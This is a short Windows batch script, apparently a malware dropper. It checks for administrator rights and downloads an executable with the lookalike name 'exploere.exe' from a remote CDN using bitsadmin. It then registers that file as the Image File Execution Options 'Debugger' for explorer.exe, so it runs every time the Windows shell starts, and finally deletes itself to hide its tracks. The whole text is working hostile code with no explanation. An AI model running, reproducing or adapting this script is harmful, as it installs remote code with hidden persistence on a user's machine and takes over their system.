>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"||exit /b
set path=C:\Users\Webpage\AppData\Local\Microsoft\Windows\GameExplorer\exploere.exe
bitsadmin /transfer a https://cdn.staticaly.com/gh/Webpage-gh/Webpage/gh-pages/other/exploere.exe %path%
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v "Debugger" /d "%path%" /f
del /f %0
